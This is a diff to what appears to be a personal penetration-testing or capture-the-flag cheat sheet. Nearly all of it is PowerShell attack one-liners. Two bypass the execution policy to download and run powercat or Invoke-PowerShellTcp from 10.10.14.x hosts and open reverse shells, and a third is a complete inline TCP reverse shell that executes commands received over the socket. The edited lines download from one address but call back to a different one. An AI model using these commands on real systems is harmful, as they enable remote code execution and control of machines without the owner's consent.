@@ -113,7 +113,14 @@ rsa:2048: use RSA encryption with a 2,048-bit key length.
 
     powershell -ExecutionPolicy Bypass -c "IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.17/powercat.ps1');powercat -c 10.10.14.17 -p 8081 -e powershell"
     
-    powershell -ExecutionPolicy Bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.134/invoke-powershell-tcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.134 -Port 443
+```
+powershell -ExecutionPolicy Bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/invoke-powershell-tcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.134 -Port 443
+```
+
+```
+powershell -ExecutionPolicy Bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.10/invoke-powershell-tcp.ps1');
+```
+
 
     $client = New-Object System.Net.Sockets.TCPClient('10.10.14.17',8081);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 
